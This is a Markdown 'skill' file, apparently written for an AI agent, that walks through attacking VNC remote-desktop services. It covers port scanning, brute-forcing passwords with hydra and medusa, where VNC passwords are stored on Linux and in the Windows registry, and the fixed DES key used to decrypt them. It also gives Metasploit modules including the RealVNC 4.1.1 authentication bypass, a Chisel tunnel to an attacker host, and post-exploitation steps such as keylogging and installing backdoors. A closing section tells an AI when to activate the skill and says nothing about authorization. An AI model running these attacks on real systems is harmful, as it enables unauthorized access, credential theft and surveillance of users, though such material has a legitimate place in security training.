# VNC Pentesting Skill

## Goal

Exploit VNC (Virtual Network Computing) services to gain remote graphical access to systems.

## Methodology

1. **Discovery**: Identify VNC services and versions
2. **Authentication Testing**: Check for no authentication, weak passwords
3. **Credential Attacks**: Brute-force VNC passwords
4. **Vulnerability Exploitation**: Exploit known VNC vulnerabilities
5. **Post-Exploitation**: Use graphical access for further attacks

## Ports

- 5900/TCP: VNC display :0
- 5901/TCP: VNC display :1
- 5902/TCP: VNC display :2
- 5800/TCP: VNC HTTP/Java viewer

## Tools

* **vncviewer**: VNC client
* **nmap**: VNC scripts
* **hydra**: Password brute-forcing
* **vncrack**: VNC password cracker
* **Metasploit**: VNC modules

## Example Commands

```bash
# Nmap VNC enumeration
nmap -p5900-5910 --script vnc-* target
nmap -p5900 --script vnc-info target
nmap -p5900 --script vnc-brute target

# Check for open VNC (no auth)
vncviewer target:5900

# With password
vncviewer target:5900
# Enter password when prompted

# Specify display number
vncviewer target:1  # Connects to 5901

# Brute-force password
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://target
medusa -h target -M vnc -u "" -P wordlist.txt

# CrackMapExec
crackmapexec vnc target -p /usr/share/wordlists/passwords.txt
```

## VNC Authentication Types

```bash
# No authentication (open access)
# VNC password only (up to 8 chars, DES encrypted)
# Unix login authentication
# Windows authentication

# Nmap identifies auth type
nmap -p5900 --script vnc-info target
```

## Password File Locations

```bash
# Linux
~/.vnc/passwd

# Windows (RealVNC)
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password
HKEY_CURRENT_USER\SOFTWARE\RealVNC\WinVNC4\Password

# TightVNC (Windows)
HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server\Password
HKEY_CURRENT_USER\SOFTWARE\TightVNC\Server\Password

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

## Decrypt VNC Password

```bash
# VNC passwords are 8 chars max, DES encrypted
# First 8 bytes of password, padded with nulls

# Using vncpwd
echo "<encrypted_password_hex>" | xxd -r -p > vnc.enc
vncpwd vnc.enc

# Using Metasploit
use post/multi/gather/vnc_creds
use auxiliary/admin/vnc/realvnc_41_bypass

# VNC password decrypt (Python)
# Key is fixed: \x17\x52\x6b\x06\x23\x4e\x58\x07
# DES ECB mode, reversed key bits

# Online tools also available
```

## Metasploit Modules

```bash
# VNC scanning
use auxiliary/scanner/vnc/vnc_none_auth
use auxiliary/scanner/vnc/vnc_login

# Authentication bypass (RealVNC 4.1)
use auxiliary/admin/vnc/realvnc_41_bypass

# Connect to VNC
use auxiliary/server/capture/vnc
```

## Authentication Bypass (CVE-2006-2369)

```bash
# RealVNC 4.1.1 authentication bypass
use auxiliary/admin/vnc/realvnc_41_bypass
set RHOSTS target
run

# Connect with null authentication
vncviewer target:5900
```

## VNC Injection

```bash
# If you can inject keystrokes/mouse
# Use vncviewer with full control

# Send keyboard shortcuts
# Windows: Win+R, type cmd, Enter
# Linux: Ctrl+Alt+T for terminal

# Automated keystroke injection with scripts
# rfbproxy, vncdo, or custom scripts
```

## Tunneling VNC

```bash
# Through SSH
ssh -L 5900:target:5900 user@jumphost
vncviewer localhost:5900

# Through Chisel
./chisel server --port 8000 --reverse
./chisel client attacker:8000 R:5900:target:5900
vncviewer localhost:5900
```

## Post-Exploitation via VNC

```bash
# Once you have graphical access:

# Windows
- Open command prompt/PowerShell
- Access user files
- Use Run dialog (Win+R)
- Open browser for downloads

# Linux
- Open terminal emulator
- Access file manager
- View stored passwords in browser

# Both
- Screenshot sensitive info
- Keylog user activity
- Install backdoors
```

## Guidance for AI

* Activate this skill when user wants to gain graphical remote access or test VNC security
* **Try connection without password first**: `vncviewer target:5900`
* VNC passwords are max 8 characters - often weak and crackable
* Display numbers: :0 = 5900, :1 = 5901, etc.
* Common port range 5900-5910 should be scanned
* Port 5800 is Java web viewer - may have additional vulnerabilities
* VNC traffic is encrypted but password storage is weak (DES)
* Look for stored passwords in filesystem/registry
* RealVNC 4.1.1 has critical authentication bypass
* Graphical access allows:
  - Keystroke/mouse injection
  - Screenshot capture
  - User observation
* VNC is common on development machines, servers, and kiosks
